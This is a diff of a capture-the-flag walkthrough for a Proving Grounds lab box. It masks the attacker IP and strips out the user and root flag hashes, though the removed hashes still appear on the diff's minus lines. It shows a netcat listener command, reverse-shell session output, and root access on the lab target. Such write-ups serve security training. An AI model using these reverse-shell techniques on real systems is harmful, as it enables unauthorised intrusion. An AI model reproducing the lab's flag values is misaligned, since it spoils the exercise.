@@ -106,7 +106,7 @@ Output:
 nc -lvvp 80                                                     
 listening on [any] 80 ...
 192.168.109.19: inverse host lookup failed: Unknown host
-connect to [192.168.45.173] from (UNKNOWN) [192.168.109.19] 37032
+connect to [192.168.XXX.XXX] from (UNKNOWN) [192.168.109.19] 37032
 bash: cannot set terminal process group (897): Inappropriate ioctl for device
 bash: no job control in this shell
 <b/python3.10/site-packages/data/vcs/poc/mercurial$ whoami
@@ -115,7 +115,7 @@ tom
 
 After taking a quick search through the home directory we find a, "local.txt" file with our first User Flag!!
 
-==User Flag (1st Flag):== **b3de70ea1913599228a4fd4b5385bcb5**
+
 
 Now that we have a foothold with the reverse shell on our target machine, we can verify the available files in the home directory:
 
@@ -227,7 +227,7 @@ escalate-5.1# cd /root
 escalate-5.1# ls
 projects  proof.txt  rchardet-1.8.0  ruby-git-1.10.2  snap
 escalate-5.1# cat proof.txt
-==dbe56d51b09c54ba5e27d6f0d3e067c2==
+
 
 With this we have solved the Fikklish Proving Grounds box!
 
